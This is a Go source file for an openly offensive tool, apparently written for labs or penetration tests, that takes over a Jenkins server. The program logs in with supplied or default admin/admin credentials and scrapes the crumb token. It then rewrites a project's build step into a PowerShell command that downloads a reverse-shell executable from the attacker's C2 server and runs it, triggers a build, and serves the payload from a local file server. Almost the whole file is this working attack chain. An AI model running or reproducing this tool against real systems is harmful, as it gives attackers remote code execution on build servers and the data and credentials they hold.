package main

import (
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var SRV http.Server
var SRVRunning bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL       string
	JenkinsCrumb  string
	Route         string
	Session       *http.Client
	Targetproject string
}

// structure defining the JSON that is required to be posted
// along with the form values in the update config request.
type ConfigJSON struct {
	Builder      BuilderJSON `json:"builder"`
	JenkinsCrumb string      `json:"jenkins-crumb"`
	Submit       string      `json:"submit"`
}

// structure defining the "builder" object within the
// required JSON that gets posted with the update config
// request. this is what defines the command that allows
// remote code execution and a foothold on the target.
type BuilderJSON struct {
	Command      string `json:"command"`
	Staplerclass string `json:"stapler-class"`
	Class        string `json:"$class"`
}

// structure designed to hold a set of login credentials.
type CredStruct struct {
	Username string
	Password string
}

// ============================================================
//
// Function Name: BuildProject
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to kick off a build of the target
//  project. This will activate the reverse shell command that
//  was injected into the build command prior to the execution
//  of this function.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) BuildProject() (err error) {
	var params url.Values = url.Values{}
	var req *http.Request
	var resp *http.Response
	var targetroute string = fmt.Sprintf("job/%s/build", c.Targetproject)
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	params.Set("delay", "0sec")

	req, err = http.NewRequest(http.MethodPost, targeturl, nil)
	if err != nil {
		return err
	}

	req.URL.RawQuery = params.Encode()

	req.Header.Set("Jenkins-Crumb", c.JenkinsCrumb)

	resp, err = c.Session.Do(req)
	if err != nil {
		if os.IsTimeout(err) {
			return nil
		}
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		return errors.New(fmt.Sprintf("[%s] error building project", resp.Status))
	}

	return nil
}

// ============================================================
//
// Function Name: CheckProject
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to confirm the existence of a project.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) CheckProject() (err error) {
	var resp *http.Response
	var targetroute string = fmt.Sprintf("job/%s", c.Targetproject)
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	resp, err = c.Session.Get(targeturl)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return errors.New(fmt.Sprintf("[%s] error locating project", resp.Status))
	}

	return nil
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  err - error. error or nil.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: GetCookie
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to login to set the JSESSION cookie for
//  the current session. This is required prior to a login.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) GetCookie() (err error) {
	var resp *http.Response
	const targetroute string = "login"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	resp, err = c.Session.Get(targeturl)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	c.Session.Jar.SetCookies(resp.Request.URL, resp.Cookies())

	return nil
}

// ============================================================
//
// Function Name: GetCrumb
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to get the Jenkins-Crumb value for the
//  target project. This is required for updating the config.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  crumb - string. jenkins crumb pulled from project.
//  err - error. error or nil.
//
// ============================================================
func (c *Client) GetCrumb() (crumb string, err error) {
	var badchars []string = []string{"\"", ",", ";", " ", ")", "("}
	var bodycontent []byte
	const pattern string = `crumb.init\("Jenkins-Crumb",.*;`
	var targetroute string = fmt.Sprintf("job/%s", c.Targetproject)

	bodycontent, err = c.GetBodyContent(targetroute)
	if err != nil {
		return "", err
	}

	crumb, err = FindMatch(bodycontent, pattern)
	if err != nil {
		return "", err
	}

	crumb = strings.Split(crumb, ",")[1]

	for _, badchar := range badchars {
		crumb = strings.ReplaceAll(crumb, badchar, "")
	}

	return crumb, nil
}

// ============================================================
//
// Function Name: Login
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to login to the target Jenkins server
//  using the credentials provided in the given CredStruct.
//
// Input(s):
//
//  creds - CredStruct. object containing login credentials.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) Login(creds CredStruct) (err error) {
	var nexturl string
	var payload url.Values = url.Values{}
	var resp *http.Response
	const targetroute string = "j_acegi_security_check"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	payload.Set("j_username", creds.Username)
	payload.Set("j_password", creds.Password)
	payload.Set("Submit", "Sign In")

	resp, err = c.Session.PostForm(targeturl, payload)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	nexturl = fmt.Sprintf("%v", resp.Request.URL)

	if nexturl == fmt.Sprintf("%s/loginError", c.baseURL) {
		return errors.New("login failed. invalid credentials.")
	}

	return nil
}

// ============================================================
//
// Function Name: SetBuildCommand
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to set the payload to inject into the
//  build command that will execute when a project gets built.
//  This payload will open a reverse shell back to the C2,
//  allowing the attacker access to the target machine.
//
// Input(s):
//
//  c2addr - string. c2 address (http://<ip>:<port>).
//  revshell - string. name of reverse shell binary.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) SetBuildCommand(c2addr string, revshell string) (err error) {
	var command string
	var jsonstring []byte
	var payload url.Values = url.Values{}
	var payloadJSON ConfigJSON = ConfigJSON{}
	var resp *http.Response
	var targetroute string = fmt.Sprintf("job/%s/configSubmit", c.Targetproject)
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	command = fmt.Sprintf(
		"powershell iex (New-Object Net.WebClient).DownloadFile('%s/%s', '%s');\n%s;",
		c2addr,
		revshell,
		revshell,
		revshell,
	)

	payloadJSON.Builder.Command = command
	payloadJSON.JenkinsCrumb = c.JenkinsCrumb
	payloadJSON.Builder.Staplerclass = "hudson.tasks.BatchFile"
	payloadJSON.Builder.Class = "hudson.tasks.BatchFile"
	payloadJSON.Submit = "Save"

	jsonstring, err = json.Marshal(payloadJSON)

	payload.Set("command", payloadJSON.Builder.Command)
	payload.Set("json", string(jsonstring))
	payload.Set("stapler-class", payloadJSON.Builder.Staplerclass)
	payload.Set("class", payloadJSON.Builder.Class)
	payload.Set("Jenkins-Crumb", c.JenkinsCrumb)
	payload.Set("Submit", payloadJSON.Submit)

	SysMsgNB("poisoning build command ...")

	resp, err = c.Session.PostForm(targeturl, payload)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if (resp.StatusCode != http.StatusOK) && (resp.StatusCode != http.StatusFound) {
		return errors.New(fmt.Sprintf("[%s] error updating config", resp.Status))
	}

	return nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) TestConnection() (err error) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (err error) {
	if (portno < 1) || (portno > 65535) {
		return errors.New("port must be between 1 and 65535")
	}
	return nil
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  err - error. error or nil.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, err error) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", err
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", errors.New("no match found")
	}

	match = string(matches[0])

	return match, nil
}

// ============================================================
//
// Function Name: GenRandomName
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random string 8 characters
//  long, containing only alpha-numeric characters.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  name - string. random name.
//  err - error. error or nil.
//
// ============================================================
func GenRandomName(minlen int, maxlen int) (name string, err error) {
	const charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var length int

	// validate min/max parameters
	if (minlen <= 0) || (maxlen <= 0) {
		return "", errors.New("min and max lengths mus be greater than zero")
	} else if minlen > maxlen {
		return "", errors.New("min length must be less than or equal to max length")
	}

	rand.Seed(time.Now().UnixMilli())

	length = rand.Intn(minlen + (maxlen - minlen))

	name = ""

	for i := 0; i < length; i++ {
		name = fmt.Sprintf("%s%s", name, string(charset[rand.Intn(len(charset))]))
	}

	return name, nil
}

//
// Function Name: GrabIPs
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to acquire all IPv4 network addresses
//    attached to the current machine. If the targetIface
//    argument is set to "", all network interfaces will be
//    searched. If a specific network interface is speficied,
//    only that interface's IP address(es) will be returned.
//    If the specified network interface does not exist, an
//    error will be returned.
//
// Input(s):
//
//    targetIface - string. interface to get IP for.
//
// Return(s):
//
//    ipList - []net.IP. list of IP addresses acquired.
//    err - error. error or nil.
//
func GrabIPs(targetIface string) (ipList []net.IP, err error) {
	var address net.Addr
	var addresses []net.Addr
	var foundiface bool = false
	var iface net.Interface
	var interfaces []net.Interface
	var ip net.IP

	//------------------------------------------------------------
	// grab all network interfaces
	//------------------------------------------------------------
	interfaces, err = net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface = range interfaces {

		//------------------------------------------------------------
		// ignore loopback addresses (127.0.0.1)
		//------------------------------------------------------------
		if strings.Contains(iface.Flags.String(), net.FlagLoopback.String()) {
			continue
		}

		//------------------------------------------------------------
		// if target interface is set, only display target
		//------------------------------------------------------------
		if (len(targetIface) > 0) && (iface.Name != targetIface) {
			continue
		}

		foundiface = true

		//------------------------------------------------------------
		// grab all addresses from current interface
		//------------------------------------------------------------
		addresses, err = iface.Addrs()
		if err != nil {
			return nil, err
		}

		//------------------------------------------------------------
		// loop through all addresses present in current interface
		//------------------------------------------------------------
		for _, address = range addresses {
			switch v := address.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			//------------------------------------------------------------
			// only grab IPv4 addresses
			//------------------------------------------------------------
			if ip.To4() == nil {
				continue
			}

			ipList = append(ipList, ip)
		}
	}

	//------------------------------------------------------------
	// error finding target (or any) network interface
	//------------------------------------------------------------
	if (len(targetIface) > 0) && !foundiface {
		return nil, errors.New(fmt.Sprintf("unable to find interface \"%s\"", targetIface))
	} else if !foundiface {
		return nil, errors.New("no network interfaces discovered")
	}

	return ipList, nil
}

//
// Function Name: StartListener
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to create an HTTP server to use during
//    this attack. It can deliver files to the target and decode
//    data coming from the target.
//
// Input(s):
//
//    ip - string. ip address to listen on.
//    port - int. port to listen on.
//    wg - *sync.WaitGroup. waitgroup this is a part of.
//
// Return(s):
//
//    err - error. error or nil.
//
func StartListener(ip string, port int, wg *sync.WaitGroup) (err error) {
	if wg != nil {
		defer wg.Done()
	}

	SRV = http.Server{Addr: fmt.Sprintf("%s:%d", ip, port)}

	var currentDir string
	var fs http.Handler

	currentDir, err = os.Getwd()

	fs = http.FileServer(http.Dir(currentDir))

	http.Handle("/", http.StripPrefix("/", fs))

	SucMsg(fmt.Sprintf("fileserver being hosted at %s:%d", ip, port))
	SRVRunning = true
	if err = SRV.ListenAndServe(); err != http.ErrServerClosed {
		SRVRunning = false
		ErrMsg(err.Error())
		return err
	}
	SucMsg("server successfully shutdown")

	return nil
}

func HandleError(err error) {
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	return
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool
	var iface bool

	var ips []net.IP
	var err error

	var c2ip string
	var c2p int

	var proxyaddr string

	var transport http.Transport = http.Transport{}
	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second, Transport: &transport}}

	var creds CredStruct = CredStruct{}
	var revshell string

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.BoolVar(&secure, "secure", false, "use HTTPS instead of HTTP")
	flag.StringVar(&c2ip, "c2ip", "", "ip, domain, or interface of C2 server")
	flag.IntVar(&c2p, "c2port", 9999, "port to contact c2 server on")
	flag.BoolVar(&iface, "interface", false, "c2ip specified is network interface")
	flag.StringVar(&proxyaddr, "proxy", "", "proxy to use when making requests (http://...)")
	flag.StringVar(&creds.Username, "username", "admin", "username to login with")
	flag.StringVar(&creds.Password, "password", "admin", "password to login with")
	flag.StringVar(&client.Targetproject, "project", "project", "project to target")
	flag.StringVar(&revshell, "revshell", "revshell.exe", "reverse shell to upload and execute")
	flag.Parse()

	err = ValidatePort(port)
	HandleError(err)

	if len(c2ip) > 0 {
		//============================================================
		// if "c2" specified is a network interface, take the
		// IP address of the interface and assign it to the
		// c2 variable to be used
		//============================================================
		if iface {
			ips, err = GrabIPs(c2ip)
			HandleError(err)
			c2ip = ips[0].String()
		}

		err = ValidatePort(c2p)
		HandleError(err)

	}

	if len(proxyaddr) > 0 {
		var proxyurl *url.URL = &url.URL{}
		var proxysplit []string = strings.Split(proxyaddr, "://")
		var hostsplit []string
		var hostroute string

		if len(proxysplit) < 2 {
			ErrMsg("proxy must be in form \"http://<address>\" or \"https://<address>\"")
			os.Exit(1)
		}

		proxyurl.Scheme = proxysplit[0]

		hostsplit = strings.Split(proxysplit[1], "/")
		proxyurl.Host = hostsplit[0]

		if len(hostsplit) > 1 {
			hostroute = strings.Join(hostsplit[1:], "/")
			proxyurl.Path = hostroute
		}

		transport.Proxy = http.ProxyURL(proxyurl)
	}

	client.Session.Jar, err = cookiejar.New(nil)
	HandleError(err)

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))

	if len(c2ip) > 0 {
		InfMsg(fmt.Sprintf("C2IP: %s", c2ip))
		InfMsg(fmt.Sprintf("C2Port: %d", c2p))
	}

	if len(proxyaddr) > 0 {
		InfMsg(fmt.Sprintf("Proxy: %s", proxyaddr))
	}

	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	// C2 address specified. start fileserver.
	if len(c2ip) > 0 {
		go StartListener(c2ip, c2p, nil)
		time.Sleep(250 * time.Millisecond)
		defer SRV.Close()
	}

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	err = client.TestConnection()
	HandleError(err)
	SucMsg("successfully connected to target")

	err = client.GetCookie()
	HandleError(err)
	SucMsg("session cookie set")

	err = client.Login(creds)
	HandleError(err)
	SucMsg("login successful")

	err = client.CheckProject()
	HandleError(err)
	SucMsg("project existence confirmed")

	client.JenkinsCrumb, err = client.GetCrumb()
	HandleError(err)
	SucMsg("crumb successfully grabbed")

	err = client.SetBuildCommand(fmt.Sprintf("http://%s:%d", c2ip, c2p), revshell)
	HandleError(err)
	SucMsg("build command successfully poisoned")

	err = client.BuildProject()
	HandleError(err)
	SucMsg("build request successful. check for reverse shell.")

	if SRVRunning {
		SysMsgNB("sleeping for 10 seconds to allow for target to reach server...")
		time.Sleep(time.Duration(10) * time.Second)
		SucMsg("exiting")
	}

	return
}

